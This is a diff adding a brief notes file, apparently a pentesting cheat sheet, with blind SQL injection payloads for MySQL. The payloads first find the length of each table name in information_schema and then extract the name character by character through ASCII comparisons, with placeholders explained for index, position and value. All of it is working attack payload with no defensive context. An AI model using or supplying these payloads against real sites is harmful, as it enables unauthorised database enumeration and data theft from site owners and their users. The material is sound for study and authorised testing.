@@ -1,0 +1,9 @@
+- Dumping the LENGHT of a table name:
+' UNION SELECT 1 WHERE (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1) = {LENGHT}-- -
+
+- Dumping character by character:
+' UNION SELECT 1 WHERE ascii(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {position}, 1)) = {ascii_value}-- -
+
+{index} — Refers to the index of the table (0 = first, 1 = second, etc.).
+{position} — Extracts a specific character of the table name.
+{ascii_value} — The ASCII value of the target character.
